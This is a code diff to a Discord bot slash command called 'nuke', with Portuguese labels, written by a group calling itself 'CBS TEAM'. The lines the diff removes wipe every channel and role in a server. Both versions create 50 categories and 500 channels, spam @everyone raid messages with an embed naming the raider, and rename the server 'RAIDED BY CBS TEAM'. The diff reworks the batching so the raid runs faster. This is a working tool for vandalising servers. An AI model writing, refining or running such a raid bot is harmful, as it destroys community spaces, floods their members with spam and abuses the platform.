@@ -1,19 +1,11 @@
 const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
-const pLimit = require('p-limit');
 const config = require('../config');
 
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('nuke')
     .setDescription('💀 CRIAÇÃO ULTRA RÁPIDA - 500 canais + spam')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
-    .addIntegerOption(option =>
-      option.setName('quantidade')
-        .setDescription('Número de canais (padrão: 500, máximo: 500)')
-        .setRequired(false)
-        .setMinValue(1)
-        .setMaxValue(500)
-    ),
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
 
   async execute(interaction, client) {
     if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator)) {
@@ -30,28 +22,78 @@ module.exports = {
     const user = interaction.user;
     const base = 'RAIDED-BY-CBS';
     const mensagem = config.raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';
-    const quantidade = interaction.options.getInteger('quantidade') || 500;
-    const limit = pLimit(20); // 20 operações simultâneas
 
     const startTime = Date.now();
 
     try {
-      // ===== 1. APAGAR TUDO (PARALELO) =====
-      await interaction.editReply('🧹 APAGANDO CANAIS, CATEGORIAS E CARGOS...');
+      // ===== 1. CRIAR CATEGORIAS (PARALELO) =====
+      await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
+      const categoryPromises = [];
+      for (let i = 0; i < 50; i++) {
+        categoryPromises.push(
+          guild.channels.create({
+            name: `${base}-CAT-${i+1}`,
+            type: ChannelType.GuildCategory,
+            reason: 'RAID CBS'
+          }).catch(() => null)
+        );
+      }
+      const categories = (await Promise.allSettled(categoryPromises))
+        .filter(r => r.status === 'fulfilled')
+        .map(r => r.value)
+        .filter(c => c !== null);
 
-      const apagarCanais = guild.channels.cache.map(ch => 
-        ch.delete().catch(() => null)
-      );
-      const apagarCargos = guild.roles.cache
-        .filter(r => r.id !== guild.id)
-        .map(r => r.delete().catch(() => null));
+      // ===== 2. CRIAR 500 CANAIS EM LOTES DE 30 (PARALELO) =====
+      await interaction.editReply('📂 CRIANDO 500 CANAIS EM LOTE...');
+      const totalCanais = 500;
+      const batchSize = 30;
+      const channels = [];
 
-      await Promise.all([...apagarCanais, ...apagarCargos]);
+      for (let i = 0; i < totalCanais; i += batchSize) {
+        const batch = [];
+        const end = Math.min(i + batchSize, totalCanais);
+        for (let j = i; j < end; j++) {
+          const cat = categories[j % categories.length] || null;
+          batch.push(
+            guild.channels.create({
+              name: `${base}-CH-${j+1}`,
+              type: ChannelType.GuildText,
+              parent: cat?.id || null,
+              topic: 'RAIDED BY CBS TEAM'
+            }).catch(() => null)
+          );
+        }
+        const created = (await Promise.allSettled(batch))
+          .filter(r => r.status === 'fulfilled')
+          .map(r => r.value)
+          .filter(c => c !== null);
+        channels.push(...created);
+        await interaction.editReply(`📂 ${channels.length}/${totalCanais} canais criados`);
+      }
 
-      // Pequena pausa para o Discord processar as deleções
-      await new Promise(r => setTimeout(r, 1000));
+      // ===== 3. SPAM EM PARALELO (LOTES DE 20) =====
+      await interaction.editReply(`💬 SPAMMANDO ${channels.length} CANAIS...`);
+      
+      const spamBatchSize = 20;
+      for (let i = 0; i < channels.length; i += spamBatchSize) {
+        const batch = channels.slice(i, i + spamBatchSize);
+        const msgPromises = batch.map(channel =>
+          channel.send({
+            content: `@everyone ${mensagem}`,
+            embeds: [{
+              title: 'CBS TEAM ESTEVE AQUI!',
+              description: `💀 RAID por ${user.tag}`,
+              color: 0xFF0000,
+              image: { url: config.raid.gifUrl },
+              timestamp: new Date()
+            }]
+          }).catch(() => null)
+        );
+        await Promise.allSettled(msgPromises);
+        await new Promise(r => setTimeout(r, 100));
+      }
 
-      // ===== 2. MUDAR NOME E FOTO =====
+      // ===== 4. MUDAR NOME E FOTO =====
       try {
         await guild.setName('RAIDED BY CBS TEAM');
         if (client.user.avatarURL()) {
@@ -61,79 +103,12 @@ module.exports = {
         }
       } catch {}
 
-      // ===== 3. CRIAR CATEGORIAS (PARALELO) =====
-      await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
-      const categoryPromises = [];
-      for (let i = 0; i < 50; i++) {
-        categoryPromises.push(
-          limit(() => guild.channels.create({
-            name: `${base}-CAT-${i+1}`,
-            type: ChannelType.GuildCategory,
-            reason: 'RAID CBS'
-          }).catch(() => null))
-        );
-      }
-      const categories = (await Promise.all(categoryPromises)).filter(c => c !== null);
-
-      // ===== 4. CRIAR CANAIS (PARALELO EM LOTES) =====
-      await interaction.editReply(`📂 CRIANDO ${quantidade} CANAIS...`);
-      const channelPromises = [];
-      for (let i = 0; i < quantidade; i++) {
-        const cat = categories[i % categories.length] || null;
-        channelPromises.push(
-          limit(() => guild.channels.create({
-            name: `${base}-CH-${i+1}`,
-            type: ChannelType.GuildText,
-            parent: cat?.id || null,
-            topic: 'RAIDED BY CBS TEAM'
-          }).catch(() => null))
-        );
-        // Atualiza progresso a cada 50 promessas
-        if (i % 50 === 0 && i > 0) {
-          await interaction.editReply(`📂 ${i}/${quantidade} canais criados`);
-        }
-      }
-      const channels = (await Promise.all(channelPromises)).filter(c => c !== null);
-      await interaction.editReply(`📂 ${channels.length}/${quantidade} canais criados`);
-
-      // ===== 5. SPAM EM PARALELO COM BACKOFF =====
-      await interaction.editReply(`💬 SPAMMANDO ${channels.length} CANAIS...`);
-      const spamPromises = channels.map(channel =>
-        limit(async () => {
-          let tentativas = 0;
-          while (tentativas < 3) {
-            try {
-              await channel.send({
-                content: `@everyone ${mensagem}`,
-                embeds: [{
-                  title: 'CBS TEAM ESTEVE AQUI!',
-                  description: `💀 RAID por ${user.tag}`,
-                  color: 0xFF0000,
-                  image: { url: config.raid.gifUrl },
-                  timestamp: new Date()
-                }]
-              });
-              return; // sucesso
-            } catch (e) {
-              if (e.code === 429) {
-                const waitTime = e.retryAfter ? e.retryAfter * 1000 : 2000;
-                await new Promise(r => setTimeout(r, waitTime));
-                tentativas++;
-              } else {
-                break;
-              }
-            }
-          }
-        })
-      );
-      await Promise.all(spamPromises);
-
-      // ===== 6. FINAL =====
+      // ===== 5. FINAL =====
       const tempo = Math.round((Date.now() - startTime) / 1000);
       await interaction.editReply(
         `✅ **NUKE ULTRA RÁPIDO CONCLUÍDO!**\n\n` +
         `📂 ${categories.length}/50 categorias\n` +
-        `📂 ${channels.length}/${quantidade} canais\n` +
+        `📂 ${channels.length}/500 canais\n` +
         `💬 ${channels.length} mensagens enviadas\n` +
         `⏱️ ${tempo}s`
       );
